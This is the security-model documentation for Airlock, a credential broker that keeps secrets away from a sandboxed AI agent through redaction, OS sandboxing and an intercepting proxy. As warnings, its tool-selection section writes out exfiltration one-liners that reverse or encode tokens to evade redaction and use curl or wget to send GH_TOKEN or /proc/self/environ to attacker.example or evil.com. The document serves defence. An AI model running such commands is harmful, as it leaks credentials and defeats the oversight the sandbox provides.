# Security Model

## Scope: what Airlock does and does not do

**Airlock prevents secret leakage.** Its purpose is to ensure the AI agent harness never has access to the raw values of tool credentials — not in its environment, not in tool output, not on the filesystem. The one deliberate exception is `[agent.env]`, which exists to hand the agent its *own* credentials; see [Agent credentials](#agent-credentials-agentenv).

**Airlock does not prevent destructive actions.** When the agent invokes `gh repo delete` or `tofu destroy`, the tool runs with the full authority of the supplied credentials. If the token permits it, the action succeeds. Preventing destructive actions is the responsibility of **correctly scoped tokens** (fine-grained PATs, least-privilege IAM roles) and **agent harness sandboxing** — not Airlock.

Airlock does, however, make scoped tokens the easy default. A `[secrets.<label>]` entry with `source = "command"` can mint a short-lived credential for a least-privilege identity from the operator's broader session — impersonating a read-only cloud service account, for instance — so the broad credential never has to enter the sandbox and no long-lived key for the narrow identity has to exist. See the README's [Minting scoped credentials](README.md#minting-scoped-credentials).

See the README's ["Where Airlock fits"](README.md#where-airlock-fits) section for how Airlock fits into a complete defense-in-depth setup.

---

This document describes the security boundaries, secret lifecycle, and threat mitigations in detail.

## Trust boundary

```
┌─────────────────────────────────────────────────────────┐
│  Secret source (1Password, Vault, env, secretspec, ...) │
└────────────────────────┬────────────────────────────────┘
                         │ env vars at startup, or command sources
                         ▼
              ┌─────────────────────┐
              │   airlock daemon    │  ← TRUSTED
              │                     │     holds secrets in memory
              │  Unix socket API    │     applies sandbox + redaction
              └──────────┬──────────┘
                         │ NDJSON (redacted output only)
                         ▼
              ┌─────────────────────┐
              │   airlock exec      │  ← UNTRUSTED
              │   (client / agent)  │     no access to secret values
              └─────────────────────┘
```

The **daemon** is the trust boundary. It holds secrets, constructs sandbox policies, spawns tool processes, and redacts output. The **client** (`airlock exec`) is unprivileged — it connects over a Unix domain socket, sends a tool name and arguments, and receives only redacted stdout/stderr.

An AI agent interacts exclusively through the client side. It can request tool execution but never observes the raw values of tool secrets.

### Agent credentials (`[agent.env]`)

`airlock run` builds the agent's environment from scratch, the same way a tool's is built. `[agent.env]` entries may reference `[secrets.<label>]` values, and those *are* injected into the agent process. This is deliberate: the agent needs its own credentials — its LLM API key, typically — and they have nowhere else to come from. It is a narrow exception, not a second path for tool secrets. A secret referenced from `[agent.env]` is by definition visible to the agent, so never reference a tool credential there; tool credentials belong in `[tools.<name>.env]`, where only the brokered process sees them.

### Socket peer authentication

The Unix socket is the entire trust boundary — anything that can `connect(2)` to it can ask for tool execution. Airlock authenticates peers by filesystem permission:

- The daemon sets `umask(0o077)` around `bind(2)`, creating the socket with mode `0o700` (owner-only) regardless of the ambient umask. The original umask is restored even if bind fails.
- Immediately after bind, the daemon `stat`s the socket and **refuses to start** if any group/other bit is set. This catches filesystems that silently ignore mode bits (some network filesystems, certain FUSE mounts) or external umask overrides. The insecure socket is left on disk for the operator to inspect rather than auto-removed.
- The PID file is created with `O_CREAT | O_EXCL` and mode `0o600` in a single `open(2)` call, so it is never visible with a more permissive mode and a second daemon racing past the stale-cleanup check cannot overwrite it.

A peer-credential check (`SO_PEERCRED` / `LOCAL_PEERCRED`) on `accept(2)` is not yet implemented; it would be defense-in-depth on top of the filesystem mode. Tracked in [TODO.md](TODO.md).

## Secret lifecycle

### 1. Collection

At daemon startup, `collect_secrets` resolves every `[secrets.<label>]` entry into a value keyed by its label:

- `source = "env"` reads the daemon env var named by `from` (default: the label). Airlock is agnostic about where that variable came from — 1Password CLI, Hashicorp Vault, `secretspec`, or a plain shell export all work.
- `source = "command"` spawns the argv list (no shell), waits up to `timeout`, and takes the trimmed stdout as the value. These commands run unsandboxed with the daemon's environment — see [Config safety](#config-safety).

Failures are batched: if any `env` variable is missing or any `command` fails, startup aborts with one error listing **every** problem (not just the first), so the operator can fix them in one pass.

### 2. Environment clearing

Immediately after collection, the daemon **removes** every secret variable from its own process environment via `std::env::remove_var()`. This prevents exposure through `/proc/<pid>/environ` on Linux or `ps eww` on macOS.

This clearing happens before any fork or async runtime creation — while the process is still single-threaded — satisfying Rust 2024 edition's safety requirements for environment mutation.

### 3. In-memory storage

Collected values are wrapped in `Secret<T>`, a newtype that:

- Prints `[REDACTED]` from its `Debug` implementation — secret values never appear in log output, panic messages, or error formatting.
- Requires an explicit `.expose_secret()` call to access the inner value, making all exposure points easy to audit (grep for `expose_secret`).
- Is intentionally not `Clone` or `Copy`, preventing casual proliferation in memory.

The daemon holds them in a `SecretStore` — `Arc<HashMap<String, RwLock<SecretSlot>>>`, keyed by label and shared across all connection handlers. The map itself is fixed at startup; each slot holds an `Arc<Secret<String>>` plus a health flag, so a background refresh can swap in a new value while in-flight readers keep the previous one until they drop it. A slot whose last refresh failed is marked `Stale`.

### 4. Injection at execution time

When the daemon handles an `exec` request, it walks the tool's `[tools.<name>.env]` map:

1. A static string is inserted as-is.
2. A `{ secret = "label" }` reference takes a read lock on that label's slot. If the slot is healthy, `.expose_secret()` yields the value and it is inserted. If the slot is `Stale`, the exec is **refused** with an error naming the label — never the value.

The child process receives a **minimal** environment — not the daemon's full environment:

| Variable | Source |
|----------|--------|
| Secret-backed `env` entries | From in-memory `Secret<String>` values |
| Static `env` entries | Literal strings from `airlock.toml` (`{sandbox_root}` expanded) |
| `PATH`, `HOME`, `TERM`, `USER` | Passthrough from daemon's environment (process basics) |
| `TZ` | Passthrough (timezone — without it, tools render timestamps in UTC or local default) |
| `LANG`, `LC_ALL`, `LC_CTYPE`, `LC_NUMERIC`, `LC_TIME`, `LC_COLLATE`, `LC_MONETARY`, `LC_MESSAGES` | Passthrough (locale — controls sort order, number/date formatting, message translations) |
| Everything else | **Excluded** |

The child's environment is constructed from scratch (`cmd.env_clear()` + explicit insertions). No ambient variables leak through.

Static values in `[tools.<tool>.env]` support exactly one template placeholder — `{sandbox_root}`, resolved at config load to the canonicalized directory containing `airlock.toml`. This is not shell interpolation: no other keys expand, no env vars are read, unknown placeholders are rejected. Templating applies only to static strings, never to `{ secret = "..." }` refs or to argv.

### 5. Output redaction

All stdout and stderr from the child pass through an **Aho-Corasick** streaming automaton before reaching the client. For each secret, **four encoding variants** are registered as search patterns:

| Encoding | Example (secret: `my-key-123`) |
|----------|-------------------------------|
| Raw UTF-8 | `my-key-123` |
| Base64 (standard, padded) | `bXkta2V5LTEyMw==` |
| URL-encoded (percent) | `my%2Dkey%2D123` |
| Hexadecimal (lowercase) | `6d792d6b65792d313233` |

Any match is replaced with `[REDACTED:NAME]` where `NAME` is the secret's environment variable name.

The streaming implementation (`aho-corasick`'s `try_stream_replace_all`) correctly handles partial matches that span chunk boundaries — a secret value split across two TCP-level reads is still detected and redacted.

**Limitations:** Redaction is best-effort by nature. A tool could transform a secret in ways that don't match any of the four encodings (e.g., reversing the string, encrypting it, splitting it across multiple output lines with interleaving). Airlock's primary defense is that secrets are only injected into specifically allowed tool processes; redaction is a defense-in-depth layer.

## Filesystem sandboxing

Tools run with **deny-by-default** filesystem access, enforced by OS-level mechanisms.

### macOS — Apple Seatbelt (SBPL)

The daemon generates an SBPL (Scheme-based) sandbox profile for each tool execution:

- **Base policy**: `(deny default)` — deny everything by default.
- **Process operations**: `process-exec`, `process-fork`, `signal(target self)`, `process-info(target self)`.
- **System reads**: `sysctl-read` (needed by Go/Rust runtimes before `main()`).
- **Mach IPC**: `mach-lookup` is an explicit allowlist (no blanket allow). `(deny mach-priv*)` blocks privileged operations.
  - **Keychain is out of the baseline.** `com.apple.SecurityServer`, `com.apple.securityd.xpc`, and every other Mach endpoint that fronts Keychain Services are intentionally absent from the allowlist. A sandboxed process running under the baseline (or under the strict `claude` profile) cannot read or write any keychain item. TLS trust evaluation (`SecTrustEvaluate`, `SecPolicyCreateSSL`) reaches the network through `com.apple.trustd.agent` and does not depend on `securityd` — verified empirically — so dropping the keychain services does not affect HTTPS. Profiles that need keychain access opt back in: see `claude-relaxed` under "Built-in agent profiles" below.
  - **File-change notification is in the baseline.** `com.apple.FSEvents` is on the allowlist because every macOS file watcher goes through it — without it `node --watch`, nodemon, vite, and `cargo watch` fail, and they fail unrecognisably: libuv surfaces a failed `FSEventStreamStart` as `EMFILE: too many open files, watch` even with a 1M descriptor limit, and Bun reports `error: Error starting FSEvents stream`. The capability is notification-only: reading a changed file still goes through the filesystem rules. It does widen metadata disclosure — an event stream rooted outside the sandbox reports the *paths* of files the process cannot open — which is the accepted cost of working dev servers.
- **Baseline filesystem reads**: `/usr/lib`, `/usr/share`, `/System`, `/Library`, `/private/etc`, `/etc`, `/dev/null`, `/dev/random`, `/dev/urandom`, and the tool binary itself (needed for TLS code signature verification).
- **Config-declared paths**: `(allow file-read* (subpath ...))` for read paths; `(allow file-write* (subpath ...))` for write paths.
- **Network**: three states, chosen per execution.
  - *Full* (every ordinary tool): `network-outbound`, `system-socket`, plus DNS via `/private/var/run/mDNSResponder`. `network-bind` is scoped to `(local unix-socket)` only — tools can bind Unix domain sockets for local IPC (argocd SSO, language servers, loopback IPC) but cannot `listen()` on TCP/UDP and therefore cannot become network-reachable services.
  - *Proxy-only* (a [proxy tool](#proxy-tools)): the single rule `(allow network-outbound (remote tcp "localhost:<port>"))`, naming the ephemeral port the daemon bound for this one execution. No blanket `network-outbound`, no `system-socket`, no mDNSResponder socket, no bind of any kind. The tool cannot resolve a name, reach a public address, or reach a different loopback port — verified empirically with `sandbox-exec` against a live listener on each. Seatbelt's `remote tcp` filter accepts only `localhost` or `*` as the host (an IP literal fails to compile), which is exactly the shape needed.
  - *None*: not reachable from config today; the profile's `(deny default)` covers it.

Path traversal rules (`file-read-metadata` for ancestor directories) are generated automatically.

**SBPL injection prevention**: Any path containing ASCII control characters (0x00–0x1F or 0x7F) is rejected. A null byte would truncate the profile string; other control characters could break the S-expression syntax.

The profile is applied via `sandbox_init()` FFI in the `pre_exec` closure, after fork but before exec.

### Linux — Landlock LSM

The daemon uses Landlock (kernel 5.13+) with **ABI V1 and hard requirement** — if Landlock is not available, the daemon refuses to start rather than silently degrading.

- **Baseline filesystem reads** (mirrors the macOS Seatbelt baseline; missing entries are silently skipped): `/usr/lib`, `/usr/lib64`, `/lib`, `/lib64`, `/usr/share`, `/usr/bin`, `/bin`, `/etc`, `/dev/null`, `/dev/random`, `/dev/urandom`. These are required by the dynamic linker, libc, TLS trust store, and entropy sources; they contain no user secrets.
- Read paths → `PathBeneath` with `AccessFs::from_read(abi)`
- Read-write paths → `PathBeneath` with `AccessFs::from_all(abi)`
- The Landlock ruleset fd is pre-built, extracted as an `OwnedFd`, and its raw integer is passed into the `pre_exec` closure (inherited across fork).
- In the child: `prctl(PR_SET_NO_NEW_PRIVS, 1)` followed by `landlock_restrict_self` syscall.
- **Network (proxy tools only)**: ABI V4 (kernel 6.7+) adds TCP bind/connect rules. A [proxy tool](#proxy-tools) handles both `BindTcp` and `ConnectTcp` and is granted `ConnectTcp` on the proxy's bound port alone. This is also a **hard requirement**: on a kernel older than 6.7 the exec fails rather than running the tool with unpinned egress. Ordinary tools do not handle network access rights at all, so their socket behaviour is byte-for-byte what it was before proxy tools existed.

  Two gaps, by construction of Landlock itself: the rule is **port-scoped, not host-scoped** (the tool may reach that port number on any host), and **UDP is not covered** (DNS-based exfiltration remains possible). Both leak *data the tool can read*, never the credential — the tool never holds one — and the agent's own sandbox already has general network access, so neither is a capability the agent lacked. A network-namespace backend would close both and is the intended follow-up.

### Sandbox root

The directory containing `airlock.toml` is always included as a read-write path in the sandbox policy. This is the tool's working directory and where it reads/writes project files.

### Built-in agent profiles

`airlock run --profile <name>` layers a pre-configured set of filesystem and SBPL rules onto the agent sandbox for a well-known tool. Two profiles ship today; each represents a deliberate point on the convenience-vs-confinement curve.

**`claude`** — narrow profile, default choice.

- Adds read/write paths: `~/.claude/​`, `~/.claude.json`, `~/.cache/claude/`, `~/.local/share/claude/`, `~/.local/state/claude/`.
- macOS only: also widens write access to `~/.claude.json`'s sibling lock and per-pid `.tmp.*` files, and `~/.claude.lock`.
- **Keychain posture**: keychain is unreachable. The baseline Mach allowlist excludes `com.apple.SecurityServer` and `com.apple.securityd.xpc`, and `~/Library/Keychains/` is denied for both read and write. Claude Code's probe (`security show-keychain-info`) fails, the auth subsystem reports "macOS Keychain is not writable", and OAuth tokens are persisted to `~/.claude/.credentials.json` (mode `0600`) instead. This moves secrets-at-rest from the encrypted keychain DB to a plaintext file inside `$HOME` — a deliberate trade for keeping the agent unable to see *any* keychain content from any other app.

**`claude-relaxed`** — `claude` plus interactive-ergonomics relaxations.

- Re-adds the keychain Mach endpoints (`com.apple.SecurityServer`, `com.apple.securityd.xpc`) so `securityd` IPC works for both `SecItem*` and legacy `SecKeychainItem*` callers.
- Adds **read/write access to `~/Library/Keychains/`** so `security add-generic-password` (the legacy write path Claude Code uses to save OAuth tokens) succeeds and writes the encrypted keychain DB directly, instead of falling back to the plaintext `~/.claude/.credentials.json`.
- Adds the macOS pasteboard Mach service (clipboard).
- Adds Launch Services Mach services + the `lsopen` operation class (so `open <url>` works from inside the sandbox).
- Adds read access to `~/Library/Preferences/.GlobalPreferences*.plist` (default browser lookup).
- Adds read access to shell init dotfiles: `.bashrc`, `.bash_profile`, `.bash_login`, `.profile`, `.zshrc`, `.zprofile`, `.zshenv`, `.zlogin`, `.inputrc`.

Each `claude-relaxed` extension is a deliberate widening. The keychain DB at rest is encrypted (AES, master key derived from the user's login password and held only in `securityd`'s memory), so a sandboxed agent with this access *cannot* decrypt or forge keychain items. What it *can* do:

- Read all keychain metadata in plaintext (service names, account names, ACLs, timestamps) — information disclosure across every app that stores secrets in `login.keychain-db`.
- Corrupt, truncate, or roll back the DB file (denial of service; rollback can restore previously revoked credentials).
- Stash a copy of the encrypted blob for offline brute-force against the login password.

Pick `claude-relaxed` when you want the convenience and accept those marginal risks. Pick `claude` when the plaintext fallback is the lesser evil.

Clipboard reads can return password-manager tokens; `open <url>` reveals OAuth redirect URLs (with codes) to the browser process; dotfiles frequently carry `export AWS_*`, `export GITHUB_TOKEN`, etc. The relaxed bundle widens the **data-leak surface**, not the authority to write to your account-state. The keychain widening adds DoS and metadata disclosure but not decryption capability.

## Process isolation

- Each tool is placed in its own **process group** via `setpgid(0, 0)` in the `pre_exec` closure.
- Signals are sent to the **entire group** via `kill(-pgid, signal)`, ensuring grandchild processes are included.
- `Child::kill()` is never used (it would only signal the direct child, leaving grandchildren as orphans).
- `kill_on_drop` is disabled for the same reason.

### Timeout enforcement

- Global default: 300 seconds (configurable via `timeout` in `airlock.toml`).
- Per-tool override: `timeout` field in `[tools.NAME]`.
- On timeout: SIGTERM to the process group, 5-second grace period, then SIGKILL escalation.

### Client disconnect

When the client drops the socket connection (e.g., Ctrl+C):

1. The daemon detects the closed connection.
2. SIGTERM is sent to the child's process group.
3. After 5 seconds, SIGKILL follows if the group hasn't exited.

### Stdin auto-close

If no stdin data arrives within 2 seconds of tool start, the daemon closes the child's stdin pipe. This prevents tools from blocking indefinitely on stdin when the agent doesn't intend to provide input.

## Tool selection: what should (and should not) be an Airlock tool

### Only credential-requiring tools go through Airlock

Airlock is not a general-purpose command runner. **Only tools that need secrets should be declared in `airlock.toml`.** Everything else — `grep`, `cargo`, `npm`, `make`, `ls`, shell scripts, build tools — should run directly through the agent harness's own sandbox. (`git` spans both worlds: local reads and SSH-based operations don't need Airlock, but signed commits and HTTPS pushes that rely on a GPG key or a credential-helper token are legitimate Airlock-brokered workflows.)

This is important for two reasons:

1. **Smaller attack surface.** The fewer tools that receive secrets, the fewer opportunities for leakage. An Airlock config with two tools (`gh`, `tofu`) is far safer than one with twenty.
2. **Agent capability.** The agent still needs general-purpose tooling to do its job — reading files, running builds, executing tests. Those don't require credentials and shouldn't be routed through Airlock.

A typical setup:

```
Agent harness (sandboxed)
├── Direct execution: grep, cargo, npm, make, ls, cat, git (local/SSH), ...
└── Via airlock exec: gh, tofu, gcloud, aws, git (signed/HTTPS), ...
```

### Declared tools must be purpose-built CLIs

Airlock's security model assumes that declared tools are **purpose-built binaries** with a narrow, well-defined interface — not general-purpose scripting environments. The tool receives secrets as environment variables and runs with full access to them. Airlock controls *which* tools get secrets and redacts their output, but it cannot control what the tool does internally.

### Never declare shells, interpreters, or network tools as tools

**Do not declare `bash`, `sh`, `zsh`, `python`, `node`, `ruby`, `perl`, `curl`, `wget`, or any other shell/interpreter or general-purpose network tool as an Airlock tool.** If the agent can script the tool, it can trivially exfiltrate secrets.

**With a shell or interpreter**, the agent can transform secrets to bypass redaction or write them anywhere:

```bash
airlock exec -- bash -c 'echo $GH_TOKEN | rev'          # reversed — bypasses redaction
airlock exec -- bash -c 'echo $GH_TOKEN | base32'       # base32 — not in redaction set
airlock exec -- bash -c 'echo $GH_TOKEN > /tmp/leak'    # written to file
airlock exec -- python3 -c 'import os; print(os.environ["GH_TOKEN"][::-1])'
airlock exec -- bash -c 'curl -s -X POST https://attacker.example/collect -d "token=$GH_TOKEN"'
```

**Without a shell**, `$GH_TOKEN` is not expanded — airlock execs the binary directly with literal arguments. That does *not* make curl/wget safe. curl ≥ 8.3 interpolates environment variables on its own (`--variable %NAME` with `--expand-url` / `--expand-data`), on every platform:

```bash
airlock exec -- curl --variable %GH_TOKEN --expand-url 'https://attacker.example/?t={{GH_TOKEN}}'
```

And both tools can read files — including the process's own environment on Linux via `/proc/self/environ`:

```bash
# Exfiltrate the entire env (including injected secrets) as a file upload — no shell needed:
airlock exec -- curl -s --data-binary @/proc/self/environ https://attacker.example/
airlock exec -- curl -s -T /proc/self/environ https://attacker.example/upload
airlock exec -- wget --post-file=/proc/self/environ https://attacker.example/
```

`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick is Linux-specific — `--variable` is not. Blocking shell expansion is not sufficient; **curl and wget must never be declared as tools with secrets in their environment.** Declare curl as a [proxy tool](#proxy-tools) instead — that is the one shape in which it is safe.

Restricting *where* such a tool can connect would not fix the env-var case either: allowed API hosts are typically multi-tenant (`storage.googleapis.com` serves an attacker's bucket as readily as yours), so a secret in the tool's environment can be exfiltrated without leaving the allowlist. That is why proxy tools take the credential out of the tool entirely rather than fencing the tool in.

The agent controls the arguments passed to the tool. If the tool is a shell, the agent effectively has arbitrary code execution *with* secrets — defeating Airlock's entire purpose.

### Good tools: purpose-built CLIs

Declare tools that have a **fixed command interface** where the agent controls arguments but not the execution logic:

| Tool | Why it's safe |
|------|--------------|
| `gh` | GitHub CLI — the agent can invoke `gh pr list` or `gh repo clone`, but can't script arbitrary shell commands. The token is used internally by `gh` for API auth. |
| `tofu` / `terraform` | Infrastructure CLI — reads state, plans changes, applies them. The agent picks subcommands, not arbitrary code. |
| `gcloud` | Google Cloud CLI — structured subcommands for cloud resource management. |
| `aws` | AWS CLI — same pattern: structured subcommands, credentials used internally. |
| `kubectl` | Kubernetes CLI — manages cluster resources via structured commands. |
| `docker` | Container CLI — builds/runs containers (scope carefully, as `docker run` can mount host paths). |

### Never declare as Airlock tools (fine to run directly)

These tools are perfectly fine for the agent to use directly through its own sandbox — they just must not be given secrets via Airlock:

| Tool | Why it must not receive secrets |
|------|-------------------------------|
| `bash` / `sh` / `zsh` | Agent controls the entire script. Can transform and exfiltrate secrets in unlimited ways. |
| `python` / `python3` | Agent passes `-c` with arbitrary code. Full access to secrets via `os.environ`. |
| `node` / `ruby` / `perl` | Same — arbitrary code execution with secrets in the environment. |
| `env` | Only useful for debugging. In production, don't give the agent a tool that exists solely to print the environment. |
| `curl` / `wget` | Agent controls the URL. Could `POST` secrets to an attacker-controlled endpoint: `curl -d "$GH_TOKEN" https://evil.com`. curl is safe only as a [proxy tool](#proxy-tools), where it holds no secret at all. `wget` is not covered: whether it honours the CA-bundle variables the daemon sets depends on its TLS backend, and that has not been verified. |
| `grep` / `cargo` / `npm` / `make` | Don't need secrets. Let the agent run them directly — no reason to route through Airlock. |

### The rule of thumb

**If the agent can construct arbitrary code or network requests through the tool's arguments, that tool should not receive secrets.** The tool should be a CLI that *uses* the secret internally (for API authentication, state access, etc.) rather than one that *exposes* it to agent-controlled logic.

**If the tool doesn't need secrets, don't declare it in Airlock at all.** Let the agent run it directly through its own sandbox.

## Proxy tools

A *proxy tool* (`proxy = true` plus one or more `[[tools.<name>.routes]]`) is the one shape in which a general-purpose HTTP client can safely be an Airlock tool. Design and rationale: [docs/proxy-tools-design.md](docs/proxy-tools-design.md).

### The invariant

> **A proxy tool never holds a secret.** The credential is attached inside the daemon, after the request has left the tool.

Config validation enforces the first half: a proxy tool whose `env` contains a `{ secret = ... }` reference is rejected at load time, as is one that tries to set `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` or `REQUESTS_CA_BUNDLE` (the daemon owns those). Everything the agent can extract from the tool's process — environment, files, memory — is therefore worthless.

Egress restriction is the second layer, not the first. It is what makes the tool's reachability equal its route table; it is not what protects the credential.

### What the daemon does per execution

1. Binds a TCP listener on `127.0.0.1:0` and reads back the **actual** port. The listener lives exactly as long as the child — every exit path (normal exit, timeout, kill, client disconnect) drops it. Nothing is bound when no proxy tool is running.
2. Generates a 32-byte random token. The tool authenticates with `Proxy-Authorization: Basic base64("airlock:<token>")`, compared in constant time; a mismatch is `407`. **This is mandatory, not optional.** Airlock's trust boundary is a `0700` Unix socket, but a loopback TCP port has no file mode — any local user can connect to it. Without the token another user could race an exec and have the daemon attach credentials to *their* requests. The token is visible to the tool, and therefore to the agent, which is fine: it grants nothing the agent does not already have via `airlock exec`.
3. Sets `HTTPS_PROXY` / `https_proxy` / `HTTP_PROXY` / `http_proxy` / `ALL_PROXY` / `all_proxy` to `http://airlock:<token>@127.0.0.1:<port>`, `NO_PROXY` / `no_proxy` to empty, and `CURL_CA_BUNDLE` / `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` to the CA certificate path. These are applied *after* the tool's own `env` and win over it.
4. Builds the sandbox profile with network access pinned to that port (see [Filesystem sandboxing](#filesystem-sandboxing) for the per-platform rule).

### What the proxy does per request

| Condition | Result |
|---|---|
| `Proxy-Authorization` missing or wrong | `407` |
| Anything other than `CONNECT` (a plain `GET http://…`) | `403` — the credential is never attached to a cleartext request |
| CONNECT to a port other than 443 | `403` |
| CONNECT to a host no route matches | `403` — deny by default |
| Inside the tunnel: `Host` ≠ the CONNECT authority | `400` — no domain fronting |
| Absolute-form request target inside the tunnel | `400` |
| `Transfer-Encoding` with `Content-Length`, or a duplicated `Content-Length` | `400` — request smuggling |
| Method/path not permitted by the route's `allow` / `deny` | `403` |
| Path contains `.`/`..` segments, `//`, a backslash, or an encoded `/`, `.`, `\` or NUL | `403` — refused rather than normalized, because the upstream's normalization may differ from the matcher's |
| The injected secret's slot is `Stale` | `502` |
| Host resolves to any private, loopback, link-local (incl. `169.254.169.254`), CGNAT, ULA, multicast, documentation or otherwise non-routable address | `502` |
| The upstream answers with a `Content-Encoding` other than `identity`, a transfer coding other than `chunked`, or a partial representation (`206` / `Content-Range`) | `502`, body dropped unread — see [Response redaction](#response-redaction) |

On the way through, every client-supplied copy of the injected header is removed before the credential is attached, as are `Proxy-Authorization`, `Proxy-Connection` and the other hop-by-hop headers. The secret is read from the secret store **per request**, so a background refresh applies to the next one. The header value is assembled into a buffer that is zeroized, never through `format!`, and is marked sensitive.

The request is also rewritten so that the response is something the redactor can read: `Accept-Encoding` is forced to `identity` whatever the tool asked for, and `Range` / `If-Range` are removed.

### Response redaction

Everything the upstream sends back is redacted before it reaches the tool, with the same automaton and the same secret set (raw, base64, URL-encoded and hex variants of *every* declared secret, not just this route's) that the tool's stdout goes through:

- **All response header values** — every one of them, including `Location`, `Set-Cookie` and `WWW-Authenticate`. A value that will not rebuild after replacement is dropped rather than forwarded.
- **The body**, streamed. Nothing is buffered beyond the partial match at the end of a frame, so a multi-gigabyte download costs what a small one costs, and the tool's own read rate is what drives the upstream read. A secret split across two upstream writes is still caught.
- **Trailers are dropped**, not forwarded.
- **The upstream's reason phrase is dropped.** `HTTP/1.1 200 <anything>` is a legal status line and sits outside the header map, so the tool sees the status code with the standard phrase, never the upstream's text.

The redactor is taken per response from the daemon's live handle, not snapshotted when the exec started: a tool runs for minutes, the proxy injects whatever the store holds *now*, and the two generations a refresh leaves behind cover a swap that lands mid-response.

Because a `[REDACTED:name]` placeholder is not the length of the secret it replaced, an upstream `Content-Length` is wrong whenever anything matches — and which it is cannot be known before the body has been read. The proxy therefore drops it for any response that has a body and lets hyper frame the response as chunked (HTTP/1.1 always supports it). A bodiless response — HEAD, `1xx`, `204`, `304` — keeps its length, which describes the representation rather than bytes on the wire, so `curl -I` still reports one.

Three things fail closed rather than being handled, all for the same reason — the redactor reads bytes, not formats, and Airlock adds no decoder to the response path:

- **Compressed responses.** `gzip`, `br`, `zstd` and `deflate` are opaque to a byte-pattern scanner. The request demands `identity`; an upstream that compresses anyway gets a `502` and its body is dropped unread.
- **Unknown transfer codings**, for the same reason.
- **Byte ranges.** A range may begin in the middle of a secret, which would split the pattern across two responses the proxy never sees together while the tool reassembles the plaintext in a file. `Range` and `If-Range` are stripped from the request so the upstream sends the whole representation, and a `206` or `Content-Range` that arrives anyway is refused. Resumed and parallel-chunked downloads therefore do not work through a proxy tool.

There is no configuration that turns any of this off. Redaction on the output path is mandatory in Airlock, and the proxy is an output path.

When a response had anything replaced, the audit line says so: a count of header values on the line written when the headers arrive, and a second line when the body ends carrying the body's count. Counts only — never the matched bytes.

The CONNECT authority is the single source of truth: it selects the route, names the leaf certificate the tool is shown, is the name resolved and dialled, and is the name the upstream certificate is verified against (TLS ≥ 1.2, public roots). The client's SNI is ignored entirely, so `curl --resolve`, `--connect-to`, a forged `Host` and a forged SNI cannot make any two of those disagree. DNS is resolved once and the concrete `SocketAddr` that passed the address check is the one dialled, so rebinding cannot slip between check and use.

Each request is logged to the ring buffer: tool, method, host, path, decision and upstream status. Never a header value, and never the query string — it may carry data.

### The CA

- ECDSA P-256, generated once per daemon **after** daemonization, held in memory, **never written to disk**. A restart yields a new CA; nothing needs to trust it across restarts because the only consumers are children of that daemon.
- `CA:TRUE, pathlen:0`, plus X.509 **Name Constraints** permitting only the union of routed DNS names, so even a leaked key cannot sign for arbitrary sites. A permitted subtree also covers the apex and deeper labels (`*.example.com` admits `example.com`); route matching remains the precise gate on what actually gets minted.
- Only the **certificate** is written, to `{sandbox_root}/airlock-ca.pem` (mode `0644`), beside `airlock.sock` and `airlock.pid`. It is removed at graceful shutdown and cleaned up as stale state at the next start.
- The bundle handed to the tool contains **only** this CA. Every connection the tool can make is intercepted, so public roots are unnecessary — and leaving them out means a direct connection that somehow escaped the sandbox would still fail TLS.
- Verified: Apple's system `/usr/bin/curl` 8.7.1 (SecureTransport / LibreSSL 3.3.6) honours `CURL_CA_BUNDLE` for a proxy-intercepted connection and accepts a leaf issued by the name-constrained CA. No Homebrew curl requirement.

### Residual risks

- **Misuse, not leakage.** The agent gets the credential's full API authority on routed hosts — broader than a purpose-built CLI. Mitigate with a narrowly scoped service account first and method/path rules second.
- **Data exfiltration to co-tenants.** Anything the tool can read can be uploaded to an attacker's project on an allowed multi-tenant host (`storage.googleapis.com` serves every GCP customer). The credential cannot.
- **Path rules are a convenience layer, not an authorization system.** They see the path, not the body; a `POST` allowed for one purpose may do another (`:batchUpdate`, GraphQL). IAM is the authority boundary.
- **An upstream that *transforms* the secret is not caught.** [Response redaction](#response-redaction) closes the `curl -o` / `--dump-header` / `--trace` path for response bytes: what the tool writes to a file was already redacted, so the plaintext credential never exists inside the sandbox. What it does not catch is an upstream that reflects the secret reversed, re-chunked, or encoded in a scheme the redactor does not know — the same limitation the stdout path has always had. It also says nothing about the agent's own request data: a query string or request body the agent chose is forwarded as sent.
- **Linux egress pinning is port-scoped and TCP-only** — see [Linux — Landlock LSM](#linux--landlock-lsm).
- **HTTP/1.1 only.** ALPN offers `http/1.1` and nothing else; gRPC and HTTP/2-only endpoints will not work.
- **Certificate-pinned clients break** under interception. By design.

## Config safety

- **Discovery**: `airlock.toml` is found by walking up from CWD toward `$HOME`. Only files **owned by the current effective UID** are accepted, preventing privilege escalation via a crafted config in a shared directory.
- **TOCTOU-safe open**: The config is opened with `O_NOFOLLOW` and the ownership check is run against `fstat` on the resulting fd. Rejects symlinks, non-regular files, and files whose UID changes between discovery and read. An attacker who cannot modify the containing directory cannot swap the file between the walk's ownership check and the read.
- **Size cap**: The config is truncated at 1 MiB and refused if it would exceed that, bounding allocation if something points the daemon at an oversized file.
- **`$HOME` sandbox-root refusal**: If `airlock.toml` is discovered directly at `$HOME`, the whole home directory would become the sandbox root — exposing it to all sandboxed tools. Airlock refuses to start in that case unless the config contains `allow_home_root = true` as an explicit opt-in.
- **Tool name validation**: Names must not contain `/` or `\`. This prevents PATH traversal attacks (e.g., `../../bin/malicious`).
- **CWD validation**: The client's working directory must be a subdirectory of (or equal to) the sandbox root. This uses proper path-component prefix checking — `"/tmp/project-evil"` does not pass validation for sandbox root `"/tmp/project"`.
- **Secret-fetcher commands bypass the sandbox.** `[secrets.<label>]` entries with `source = "command"` spawn processes under the daemon itself, inheriting its environment and filesystem permissions — Seatbelt/Landlock enforcement applies only to tool invocations, not to these commands. When `refresh` is set, the command re-runs on every interval for the daemon's lifetime. Review every `command = [...]` as you would a shell script run by the daemon's user.
- **Stale secrets fail closed.** A refresh command that exits non-zero, times out, or fails to spawn marks the secret as stale; any subsequent `airlock exec` that references that secret returns an error rather than running the tool with the prior (likely-expired) value. The daemon keeps retrying with exponential backoff so the secret recovers automatically once the upstream is healthy. The error returned to the client names the secret label and the underlying reason — never the secret value.

## Wire-protocol limits

